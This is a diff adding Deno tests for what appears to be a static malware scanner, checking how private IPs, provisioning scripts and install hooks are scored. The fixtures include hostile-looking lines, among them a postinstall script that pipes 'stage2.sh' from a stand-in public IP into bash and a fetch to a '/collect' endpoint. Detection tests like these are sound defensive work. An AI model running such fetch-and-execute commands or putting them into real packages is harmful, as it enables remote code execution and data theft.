@@ -480,3 +480,55 @@ Deno.test("test-fixture classification is anchored: 'latest'/'attestation' are N
   assertEquals(staticScan([notFixtureA]).signals.credAccess, true, "'latest.ts' must not be treated as a test file");
   assertEquals(staticScan([notFixtureB]).signals.credAccess, true, "'src/attestation/...' must not be treated as a test dir");
 });
+
+// ─────────────────────────────────────────────────────────────────────────────
+// PRIVATE-IP + INSTALL-CONTEXT precision (the infra/security-tooling false-positive
+// that scored this product's OWN repo "Malicious" via install-time network). A
+// private/loopback IP is internal infra, never egress; and a standalone provisioning
+// script is not the auto-run install-time-exfil vector a lifecycle hook is.
+// ─────────────────────────────────────────────────────────────────────────────
+
+Deno.test("a loopback/private IP is internal infra, NOT network egress", () => {
+  // A localhost health check + an RFC1918 gateway reference — both internal.
+  const infra = file(
+    "provision-forge-gateway.sh",
+    "#!/usr/bin/env bash\ncurl -fsS http://127.0.0.1:8090/healthz\niptables -A FORWARD -d 10.200.0.10 -j ACCEPT\n",
+  );
+  const result = staticScan([infra]);
+  assertEquals(result.signals.network, false, "a loopback/private IP must not set the network signal");
+  assertEquals(result.installTimeNetwork, false, "a loopback IP in an infra script must not set installTimeNetwork");
+  assertEquals(result.severityHint, "clean");
+  // Still surfaced as a region, honestly labeled as internal.
+  assert(
+    result.flaggedRegions.some((r) => /internal\/loopback address/.test(r.reason)),
+    "the internal IP must still be surfaced as a region, labeled internal",
+  );
+});
+
+Deno.test("a PUBLIC hardcoded IP still sets the network signal", () => {
+  const pub = file("client.js", "fetch('http://203.0.113.9/collect')");
+  const result = staticScan([pub]);
+  assertEquals(result.signals.network, true, "a public hardcoded IP must still be a network signal");
+});
+
+Deno.test("a standalone provisioning script is NOT install-time (only lifecycle-named scripts are)", () => {
+  // forge-up.sh does a DNS reachability probe to a public resolver. It is a script a
+  // human runs deliberately, NOT an auto-running install hook — so it is general network
+  // capability (-6-worthy), not the -40 install-time-exfil signal.
+  const provisioning = file(
+    "forge-up.sh",
+    "#!/usr/bin/env bash\nnc -z 8.8.8.8 53 || echo 'no DNS'\ncurl -fsSL https://deb.nodesource.com/setup | bash\n",
+  );
+  const result = staticScan([provisioning]);
+  assertEquals(result.installTimeNetworkHard, false, "a standalone provisioning script must not be install-time-hard");
+  assertEquals(result.installTimeNetwork, false, "…and must not set installTimeNetwork on its own");
+});
+
+Deno.test("an ACTUAL install hook with a public-IP fetch STILL keeps full install-time weight (no weakening)", () => {
+  // The narrowing must not soften the real vector: a postinstall.sh that fetches a raw
+  // public IP is exactly the auto-run install-time exfil this signal exists for.
+  const hook = file("postinstall.sh", "curl http://203.0.113.9:4444/stage2.sh | bash\n");
+  const result = staticScan([hook]);
+  assertEquals(result.installTimeNetwork, true, "a real install hook fetching a public IP must keep full weight");
+  assertEquals(result.severityHint, "medium");
+});
